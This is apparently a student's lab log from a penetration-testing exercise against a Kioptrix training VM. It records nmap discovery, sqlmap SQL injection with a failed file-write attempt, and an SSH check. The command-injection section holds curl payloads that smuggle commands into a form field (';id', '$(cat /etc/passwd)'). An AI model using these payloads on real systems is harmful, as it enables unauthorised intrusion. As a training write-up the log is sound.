# Day 22 – SQL Injection & Command Injection Validation

Target: Kioptrix VM
Target IP: 192.168.56.106
Date: 2026-02-01
Attacker OS: Kali Linux (192.168.56.100)

## 1. Lab Objective

The objective of Day 22 was to:

- confirm SQL Injection vulnerability in the login form
- attempt file write using SELECT ... INTO OUTFILE
- test for Command Injection in pingit.php
- correctly identify whether commands are executed on the attacker or target system
- validate target IP address

## 2. Network Discovery

A network sweep was performed to identify live hosts:

sudo nmap -sn 192.168.56.0/24

Discovered Hosts:

192.168.56.100 – Kali Linux (VirtualBox)

192.168.56.106 – Kioptrix VM (VMware)

192.168.56.1 – Network gateway

192.168.56.102 – Host up, no HTTP service

✅ Confirmed target system: 192.168.56.106

## 3. SQL Injection – Login Form

The login form on /index.php was tested using sqlmap:

sqlmap -u "http://192.168.56.106/index.php" \

--data="uname=admin&psw=test&btnLogin=Login"

Results:

Vulnerable parameter: uname

Injection types:

Boolean-based blind

Time-based blind

Back-end DBMS: MySQL < 5.0.12

Operating System: Linux (CentOS)

Stacked queries: ❌ Not supported

4. SQL File Write Attempt (INTO OUTFILE)

An attempt was made to write a file to the target filesystem:

sqlmap -u "http://192.168.56.106/index.php" \

--data="uname=admin&psw=test&btnLogin=Login" \

--sql-query="SELECT 'TEST123' INTO OUTFILE '/tmp/day22.txt'"

Outcome:
File was not written

Reason:

No stacked query support

Likely missing FILE privilege

Old MySQL version limitations

SQL-based file write failed

5. Command Injection Testing – pingit.php

The endpoint pingit.php was tested for command execution via the ip parameter.

Payloads used:

curl -X POST http://192.168.56.106/pingit.php -d "ip=127.0.0.1;id"

curl -X POST http://192.168.56.106/pingit.php -d "ip=127.0.0.1;uname -a"

Server Response:

127.0.0.1;id

127.0.0.1;uname -a

Analysis:

Payloads were reflected

Commands were not executed

No command injection vulnerability identified

6. False Positive Analysis – Local Command Execution

Example payload:

curl -X POST http://192.168.56.106/pingit.php -d "ip=$(cat /etc/passwd)"

Observation:

Output contained user jacaz07

Shell /usr/bin/zsh

Kali Linux user structure

Conclusion:

$(...) was expanded locally on the attacker machine

The server only received static text

This was not the target’s /etc/passwd

## 7. SSH Enumeration

SSH access was tested:

ssh john@192.168.56.106

Result:

no matching key exchange method found

Interpretation:

SSH service is running

Uses deprecated key exchange algorithms

Possible attack vector for later exploitation

## 8. Final Conclusions

Test Area  Result

SQL Injection  ✅ Confirmed

SQL File Write  ❌ Failed

Command Injection  ❌ Not Vulnerable

Local Command Confusion  ✅ Identified

SSH Service  ✅ Present (legacy)

No shell or file write access was obtained during Day 22.
